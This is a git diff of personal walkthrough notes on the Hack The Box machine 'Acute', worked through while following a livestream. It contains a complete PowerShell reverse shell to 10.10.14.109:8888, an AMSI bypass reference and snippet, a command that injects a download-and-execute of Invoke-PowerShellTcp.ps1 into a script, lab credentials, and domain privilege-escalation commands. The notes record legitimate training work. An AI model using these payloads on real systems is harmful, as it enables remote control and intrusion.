@@ -12,10 +12,13 @@ Learnt:
 - Password reuse, password reuse
 - Weird Admin scripts exist in real life, Uber 2022
 
-Had a pretty terrible couple of days, awhile still being healthy and solved some more administrative issues. No boxes were done and I am returningto power through the next exam like 12 hours brutality fun-time-fail-and-fix. One day in one day off. I need a good five hours of fun and practical learning and recall. These streams are great for that as Al is always either two steps ahead of me or I am ahead by a step whiel he is using the other half of his brain to throw out questions, testing the audience and answering questions about relevant cyber security questions.
-[Alh4zr3d](https://www.youtube.com/watch?v=IRSm7kalGPY) stream and after following along I will read 0xDF writeup on this and another from another source.
+Had a pretty terrible couple of days, awhile still being healthy and solved some more administrative issues. No boxes were done and I am returningto power through the next exam like 12 hours brutality fun-time-fail-and-fix. One day in one day off. I need a good five hours of fun and practical learning and recall. These streams are great for that as Al is always either two steps ahead of me or I am ahead by a step whiel he is using the other half of his brain to throw out questions, testing the audience and answering questions about relevant cyber security questions. [Alh4zr3d](https://www.youtube.com/watch?v=IRSm7kalGPY) stream and after following along I will read 0xDF writeup on this and another from another source.
 
 If I ever am fortunate enough to be a part of a group people hacking away I am definite wqant to bring this kind of style - with less noisey and shouty American(I like it but I dont think in the same room as other it would work as well) and more Ed Skoudis or Marcus Hutchins(although with more exciting than calm) though. How can ever burnout with a group learning and doing stuff together. Edit he pulls a Bob Ross on the stream so my comments here somewhat muted.
+
+#### Returning in 2023
+
+Watching along for the big giveaway on the [Alh4zr3d stream](https://www.twitch.tv/alh4zr3d) . I notice that there is no Beyond Root section and general text so I will add it while finishing [[Reddish-Helped-Through]], hopefully... but hanging out with everyone on stream and tightening up this Helped-Through. While quickly skimming my notes I realsied the trolls had won and voted for this nightmare machine. Poor Al, I won marbles, by default coming 1st, but not 69th so this was emotional very disonnant - both amazing and real concern that Al heading for malding of a lifetime.
 
 ## Recon
 
@@ -28,14 +31,17 @@ My inital masscan failed so all more my automated recon goes full manual till I 
 
 `atsserver.acute.local`, therefore add to /etc/hosts and subdomain brute force and double check DNS and Kerberos as .local is not local network .tld used in AD. which is weird. Stating the tought process to state it as the reason not that I know it is an AD box. After I had finish scanning and the extra checks my first thought while Al preps  the box and stream I remember read a ssl cert tool bug bounty hunters use - found it in my Automated Recon setup for Bug Bounty - the Osint part is legitimately almost done, my rust part no where near done, but my bash automation is good enough, the subdomain bruteforce willl not take long. 
 
-Nuclei:
-[IIS 10](microsoft-iis-version-https___atsserver.acute.local) 
+Nuclei: [IIS 10](microsoft-iis-version-https___atsserver.acute.local) 
 
 Burp:
-
 Acute/ - directory structuring
-Userson about page
+Users on about page:
 Aileen Wallace, Charlotte Hall, Evan Davies, Ieuan Monks, Joshua Morgan, and Lois Hopkins.
+
+#### Shadow Credentials - 2023 - addition
+
+Domain Dominance technique by abusing AD certifact services to log in to a user without password.
+
 
 New starter forms
 ![](noonenewcanstartatacute.png)
@@ -80,14 +86,12 @@ $ExecutionContext.SessionState.LanguageMode
 ```
 
 Most recent versions of Windows **DOES NOT HAVE POWERSHELL v2**
-
 ![](amsibypasscheck.png)
 
 The  bypass Al used threw this error
 ![](thisbypassfailed.png)
 
 If patched, just change up the strings/variables. https://github.com/sinfulz/JustEvadeBro
-
 ```powershell
 # Enumerate AMSI
 $str = 'amsiinitfailed'
@@ -113,12 +117,13 @@ Weird directory pointed out be a member of the stream:
 Why is this there, my eyelids have icacls.exe icacls.exe under each. 
 ![](icalcstheutils.png)
 
-
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.14.109',8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ![](runningontotherevshell.png)
+
+## Enumeration
 
 ```powershell
 get-process 
@@ -157,7 +162,7 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"
 Never used meterpreter screenshare.
 
 ![](badedavies.png)
-The key important detail here is not there! I missed the `-ConfigationName dc_manage`
+The key important detail here is not there! I missed the `-ConfigurationName dc_manage`
 
 `acute\imonks`
 `W3_4R3_th3_f0rce.`
@@ -219,9 +224,7 @@ invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential 
 
 Ok it really does not like being replaced more than once.  I tried calling the meterpreter shell from `C:\util` in the script but that failed.
 
-
-2:30-55
-https://www.youtube.com/watch?v=IRSm7kalGPY
+[2:30-55](https://www.youtube.com/watch?v=IRSm7kalGPY)
 
 ```powershell
 invoke-command -computername ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ((Get-Content -Path C:\Users\imonks\desktop\wm.ps1 -Raw) -replace 'Get-Volume', 'IEX(New-Object Net.WebClient).downloadString("http://10.10.14.109/Invoke-PowerShellTcp.ps1")') | set-Content -Path C:\Users\imonks\desktop\wm.ps1 } 
@@ -274,7 +277,7 @@ Before uploading any AD enumeration tool or enumerating for AD related stuff.
 Weird can't re run:
 ![](cantrerunregqc.png)
 
-Need to strech and then have more relax hour to finish this one off while I wait for other background stuff to finsih other boxes. From [2:47:34](https://www.youtube.com/watch?v=IRSm7kalGPY&t=10030s)
+Need to strech and then have more relax hour to finish this one off while I wait for other background stuff to finish other boxes. From [2:47:34](https://www.youtube.com/watch?v=IRSm7kalGPY&t=10030s)
 
 ![](weareadmin.png)
 
@@ -328,6 +331,14 @@ Invoke-Command -ScriptBlock { Set-Content -Path 'c:\program files\keepmeon\0xdf.
 
 Invoke-Command -ScriptBlock { cat '\program files\keepmeon\0xdf.bat' } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
 net group site_admin awallace /add /domain
-# Root.tx is readable
+# Root.txt is readable
 Invoke-Command -ScriptBlock { cat c:\users\administrator\desktop\root.txt  } -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred
+```
+
+#### Stream intersting 
+
+ccorebytes mentions - https://learn.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.securestringtobstr?view=net-7.0
+Although we have limited commands 
+```powershell
+[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($securestring)
 ```
